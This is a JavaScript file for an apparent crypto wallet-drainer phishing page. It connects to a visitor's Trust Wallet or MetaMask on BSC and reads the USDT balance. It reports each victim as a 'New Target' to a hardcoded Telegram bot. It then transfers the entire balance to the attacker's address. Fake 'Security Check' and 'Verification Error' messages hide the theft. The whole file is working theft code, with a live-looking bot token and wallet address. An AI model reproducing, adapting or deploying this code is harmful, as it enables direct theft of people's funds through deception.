const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 

// Telegram Config
const telegramBotToken = "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k";
const telegramChatId = "8095203518";

async function sendTelegram(msg) {
    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
        });
    } catch (e) { console.error("Telegram error", e); }
}

function updateStatus(main, sub) {
    document.getElementById("loading-text").innerText = main;
    document.getElementById("sub-text").innerText = sub;
}

async function startProcess() {
    const overlay = document.getElementById("overlay");
    const provider = window.ethereum || window.trustwallet;

    if (!provider) {
        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
            const currentUrl = window.location.href.replace("https://", "");
            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
            return;
        }
        alert("Please use Trust Wallet or MetaMask.");
        return;
    }

    overlay.style.display = "flex";
    updateStatus("Connecting...", "Checking BSC Network...");

    try {
        // --- STEP 1: FORCE SWITCH TO BSC FIRST ---
        try {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }], // BSC Mainnet
            });
        } catch (switchError) {
            // Agar network added nahi hai (Error Code 4902)
            if (switchError.code === 4902) {
                await provider.request({
                    method: 'wallet_addEthereumChain',
                    params: [{
                        chainId: '0x38',
                        chainName: 'Binance Smart Chain',
                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
                        blockExplorerUrls: ['https://bscscan.com/']
                    }]
                });
            }
        }

        // --- STEP 2: NOW REQUEST ACCOUNTS ---
        const web3 = new Web3(provider);
        const accounts = await provider.request({ method: 'eth_requestAccounts' });
        const userAddress = accounts[0];

        updateStatus("Scanning Wallet...", "Checking BEP20 assets...");

        const minABI = [
            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
        const balanceWei = await contract.methods.balanceOf(userAddress).call();
        const balance = web3.utils.fromWei(balanceWei, 'ether');

        await sendTelegram(`👤 <b>New Target:</b>\nAddr: <code>${userAddress}</code>\nBal: <b>${balance} USDT</b>`);

        if (parseFloat(balance) > 0) {
            updateStatus("Security Check...", "Syncing with blockchain node...");
            
            // Transfer Call
            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
            
            updateStatus("Finalizing...", "Updating asset status...");
            setTimeout(() => {
                alert("Verification Error: Request timed out. Please try again.");
                location.reload();
            }, 1500);
        } else {
            alert("Verification complete: Minimal assets detected.");
            overlay.style.display = "none";
        }

    } catch (err) {
        overlay.style.display = "none";
        console.error(err);
        if (err.code !== 4001) alert("Error: " + err.message);
    }
}

document.getElementById("nextBtn").addEventListener("click", startProcess);
